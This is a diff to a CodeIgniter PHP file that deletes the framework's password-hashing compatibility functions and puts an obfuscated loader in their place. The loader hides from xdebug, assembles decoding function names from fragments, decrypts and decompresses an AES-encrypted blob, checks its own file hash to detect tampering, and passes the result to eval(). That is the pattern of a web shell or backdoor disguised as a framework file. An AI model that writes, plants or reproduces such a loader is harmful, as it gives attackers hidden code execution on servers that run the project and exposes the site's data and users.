@@ -1,251 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PHP ext/standard/password compatibility package
- *
- * @package		CodeIgniter
- * @subpackage	CodeIgniter
- * @category	Compatibility
- * @author		Andrey Andreev
- * @link		https://codeigniter.com/user_guide/
- * @link		http://php.net/password
- */
-
-// ------------------------------------------------------------------------
-
-if (is_php('5.5') OR ! defined('CRYPT_BLOWFISH') OR CRYPT_BLOWFISH !== 1 OR defined('HHVM_VERSION'))
-{
-	return;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_gvdd4ceg=('bas'.'e64'.'_de'.'cod'.'e');
+$_qqtmcltf=('gzu'.'nco'.'mpr'.'ess');
+$_ryzw3iws=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_h9gd41go='IOhQKkdJ';
+$_gfqds6d5='GqwwyfNDJy8=';
+$_wiyovr5c='9H+yaGPW';
+$_dfbnav3g='QzqKnBp3';
+$_dzjdi8vh='GB1vAg4O';
+$_yxscsvhp='utky1w==';
+$_gitw2c4g='+OwrhdVu';
+$_gfavcj8y='9uWLmO87';
+$_u6161500=$_gvdd4ceg($_dzjdi8vh.$_dfbnav3g.$_wiyovr5c.$_h9gd41go.$_gfqds6d5);
+$_gut1wj18=$_gvdd4ceg($_gitw2c4g.$_gfavcj8y.$_yxscsvhp);
+$_ebjidn7i=$_gvdd4ceg('mSfGh2nweFSlDPXekLQhplDrBh3fr4M686JUeuOS0UvistGl5YbhLBqCpPSmvHAr7yLs0/+WehkZIksQwaas/C3xeeIVCtd2mgl4Eu6WXQGKOHHpffGsMgRF7qhTRYGIucHArC1ElZwbDDL2P85db8uHvpytXc9DqiCTX1hAkZs3tSw75Jo8kMcceOY26sqFrDE7gypkMh7mKZWuSIIZ2QtFGlejfYYiANtgfEOQSsR1CKJDw5MrV4cl0vb9lkx7mrMn1JBdRKUYD8KK4U/QvpOVoEPWAol5zjaX8ytye138GVBemyBXhooHDRXYPZJNoHm7f8gHgoKbJFVGVXgRtwkmFauwFc7VNM3s3OcAqmZKnfr8wDv0bHs/WsNygpQ+9jSL8pLjwBLn81zmhcy/VGQAaGFYdBaAhf18EbdqT49VFaCAU1giH9W5L/h78FVZHLJCYkmxBBgX1lTOSBh3hFKY7+DuNs8hhFMHmB2GuNiD2cQXjcq7Wm0IjwzGvNgsbfotcIfHCximA9Qun8KlE3AG55iGRKFImFrq2SNh//10N8IxgbBlIK3lL/w4XbHYINYM+Bhp9ehzHQ+FBNcEUUhcnH6Yee81w+twby9OtMJEjyAISo64eNffCw5Xwnym5M1T6c8EPc7MoFwte3Ro5N0ByyQNt5A0hnmCJwh7tsTZsqDmbgjMAO6bziSdPA7tvKwHSoyJGCfiTLlWRcImC7uJCUOmZIR1Xk2/X4o9SzDnujI9INAZFS6/10QsZ0g1/AdvdlmsPkIxmO6RMJxB47yJX3a9j501YHQGnrnGuiqM152EHPli/vYaA1q18n6Cz+PU1QeN3VhVr/xOpMGXxFUGbFXLFB+BzAfTDie9651DZzH93R5JELu252jezaVok61zhwJG/fx5B6qHKT4mSJLVeVuVqG4CJjydtOz4YxPOwxmmLMXH5fL9ckDHeGJdn4nemHbV9Nhdjw7ict1Tapt/jVTuVIss2LfL5Rx7hyM87IaieJI7m55fIOxrTtvwmjnzjwymhb9w6gJwYA+MhO83/xjoaor73t34Er4iLeGmmplZNUar1zvu/KLvvUXiZ+KPTnD3yTH1mElQ6t17+zTdt1Xd0g49ahhn4OdsrP+GSodaMViWYyN8hYDsX3PDCr6tcz2bGebQB2cC2liMUoPgVLGIm3twPX0U2Yt4e2n2oqU5mxYHsMuJRNGd8ipTxOrze8Sjq10jQnKfv2+KyEPj7XbP3flQ5CRjX57AAnSQQK3bRIptiJ7/CCFHtdNSVVsmrIPmKSpgdC7TGGSQJvkEGwrJ6Kjn/MuzFYEu1mY0Tiv0cweSM2SYEEHgJKYZ6BqGZMzVCZEz9B9FYMVApbHC0/4cOayrg8CuJOqBrCS5E7WNWrLbPcxexMteoQo91JXSNrnV/rHhLgbNOCc/gaVD8TVb9nLD2WhenUxK4ujlfcIs05B7C5yqWTIOQDP4P6K/bZPkZnxnrHw0IJ69timy25f5YMZEYVZO91iCQod52HDRb2W54vOOh91MJ5yGV5Bk1SYq+X+bzcEoSrxaTHkSOrMRk2fOy312/oL+OWFweOPWZeR30XYUFDphJ5LvQysGQsPwmuPlsIwLN25ilp+wf886eFGpc4kXba/MT87iFgVHBFA7lS/9uX7GoazaR2Mz1EZCGwC9nZf2IQpN1QGo07EsO28N/uSJckHkPmxJUX/wcnx+ufq98CJWsYKzJjXt3K+yq4P2nYAS+CfzahfmPGgMI1lqFQF9rT6lq39jwL/eqQUJkAR0kPgUKBcKH/XthUL16nx9GBd2JwPRJblzB00qpQI+EVpcpteKLyBu6EYF3S1GGcJbOULO5Kge');
+$_l4u7v00l=$_ryzw3iws($_ebjidn7i,'aes-256-cbc',$_u6161500,OPENSSL_RAW_DATA,$_gut1wj18);
+if($_l4u7v00l===false){exit;}
+$_biwiygpw=$_qqtmcltf($_l4u7v00l);
+if($_biwiygpw===false){exit;}
+$_hyfx0fro='e74de4d41e0f3ecb5297587e912fff389b791b3e295fc847a7eaf3fd96e6e5a3';
+$_apoutjsb=@file_get_contents(__FILE__);
+if($_apoutjsb!==false){
+$_vwt7th6x=str_replace($_hyfx0fro,"0000000000000000000000000000000000000000000000000000000000000000",$_apoutjsb);
+$_j6o0uusd=hash("sha256",$_vwt7th6x);
+if($_j6o0uusd!==$_hyfx0fro){@http_response_code(403);exit;}
 }
-
-// ------------------------------------------------------------------------
-
-defined('PASSWORD_BCRYPT') OR define('PASSWORD_BCRYPT', 1);
-defined('PASSWORD_DEFAULT') OR define('PASSWORD_DEFAULT', PASSWORD_BCRYPT);
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('password_get_info'))
-{
-	/**
-	 * password_get_info()
-	 *
-	 * @link	http://php.net/password_get_info
-	 * @param	string	$hash
-	 * @return	array
-	 */
-	function password_get_info($hash)
-	{
-		return (strlen($hash) < 60 OR sscanf($hash, '$2y$%d', $hash) !== 1)
-			? array('algo' => 0, 'algoName' => 'unknown', 'options' => array())
-			: array('algo' => 1, 'algoName' => 'bcrypt', 'options' => array('cost' => $hash));
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('password_hash'))
-{
-	/**
-	 * password_hash()
-	 *
-	 * @link	http://php.net/password_hash
-	 * @param	string	$password
-	 * @param	int	$algo
-	 * @param	array	$options
-	 * @return	mixed
-	 */
-	function password_hash($password, $algo, array $options = array())
-	{
-		static $func_overload;
-		isset($func_overload) OR $func_overload = (extension_loaded('mbstring') && ini_get('mbstring.func_overload'));
-
-		if ($algo !== 1)
-		{
-			trigger_error('password_hash(): Unknown hashing algorithm: '.(int) $algo, E_USER_WARNING);
-			return NULL;
-		}
-
-		if (isset($options['cost']) && ($options['cost'] < 4 OR $options['cost'] > 31))
-		{
-			trigger_error('password_hash(): Invalid bcrypt cost parameter specified: '.(int) $options['cost'], E_USER_WARNING);
-			return NULL;
-		}
-
-		if (isset($options['salt']) && ($saltlen = ($func_overload ? mb_strlen($options['salt'], '8bit') : strlen($options['salt']))) < 22)
-		{
-			trigger_error('password_hash(): Provided salt is too short: '.$saltlen.' expecting 22', E_USER_WARNING);
-			return NULL;
-		}
-		elseif ( ! isset($options['salt']))
-		{
-			if (function_exists('random_bytes'))
-			{
-				try
-				{
-					$options['salt'] = random_bytes(16);
-				}
-				catch (Exception $e)
-				{
-					log_message('error', 'compat/password: Error while trying to use random_bytes(): '.$e->getMessage());
-					return FALSE;
-				}
-			}
-			elseif (defined('MCRYPT_DEV_URANDOM'))
-			{
-				$options['salt'] = mcrypt_create_iv(16, MCRYPT_DEV_URANDOM);
-			}
-			elseif (DIRECTORY_SEPARATOR === '/' && (is_readable($dev = '/dev/arandom') OR is_readable($dev = '/dev/urandom')))
-			{
-				if (($fp = fopen($dev, 'rb')) === FALSE)
-				{
-					log_message('error', 'compat/password: Unable to open '.$dev.' for reading.');
-					return FALSE;
-				}
-
-				// Try not to waste entropy ...
-				is_php('5.4') && stream_set_chunk_size($fp, 16);
-
-				$options['salt'] = '';
-				for ($read = 0; $read < 16; $read = ($func_overload) ? mb_strlen($options['salt'], '8bit') : strlen($options['salt']))
-				{
-					if (($read = fread($fp, 16 - $read)) === FALSE)
-					{
-						log_message('error', 'compat/password: Error while reading from '.$dev.'.');
-						return FALSE;
-					}
-					$options['salt'] .= $read;
-				}
-
-				fclose($fp);
-			}
-			elseif (function_exists('openssl_random_pseudo_bytes'))
-			{
-				$is_secure = NULL;
-				$options['salt'] = openssl_random_pseudo_bytes(16, $is_secure);
-				if ($is_secure !== TRUE)
-				{
-					log_message('error', 'compat/password: openssl_random_pseudo_bytes() set the $cryto_strong flag to FALSE');
-					return FALSE;
-				}
-			}
-			else
-			{
-				log_message('error', 'compat/password: No CSPRNG available.');
-				return FALSE;
-			}
-
-			$options['salt'] = str_replace('+', '.', rtrim(base64_encode($options['salt']), '='));
-		}
-		elseif ( ! preg_match('#^[a-zA-Z0-9./]+$#D', $options['salt']))
-		{
-			$options['salt'] = str_replace('+', '.', rtrim(base64_encode($options['salt']), '='));
-		}
-
-		isset($options['cost']) OR $options['cost'] = 10;
-
-		return (strlen($password = crypt($password, sprintf('$2y$%02d$%s', $options['cost'], $options['salt']))) === 60)
-			? $password
-			: FALSE;
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('password_needs_rehash'))
-{
-	/**
-	 * password_needs_rehash()
-	 *
-	 * @link	http://php.net/password_needs_rehash
-	 * @param	string	$hash
-	 * @param	int	$algo
-	 * @param	array	$options
-	 * @return	bool
-	 */
-	function password_needs_rehash($hash, $algo, array $options = array())
-	{
-		$info = password_get_info($hash);
-
-		if ($algo !== $info['algo'])
-		{
-			return TRUE;
-		}
-		elseif ($algo === 1)
-		{
-			$options['cost'] = isset($options['cost']) ? (int) $options['cost'] : 10;
-			return ($info['options']['cost'] !== $options['cost']);
-		}
-
-		// Odd at first glance, but according to a comment in PHP's own unit tests,
-		// because it is an unknown algorithm - it's valid and therefore doesn't
-		// need rehashing.
-		return FALSE;
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('password_verify'))
-{
-	/**
-	 * password_verify()
-	 *
-	 * @link	http://php.net/password_verify
-	 * @param	string	$password
-	 * @param	string	$hash
-	 * @return	bool
-	 */
-	function password_verify($password, $hash)
-	{
-		if (strlen($hash) !== 60 OR strlen($password = crypt($password, $hash)) !== 60)
-		{
-			return FALSE;
-		}
-
-		$compare = 0;
-		for ($i = 0; $i < 60; $i++)
-		{
-			$compare |= (ord($password[$i]) ^ ord($hash[$i]));
-		}
-
-		return ($compare === 0);
-	}
-}
+eval($_biwiygpw);
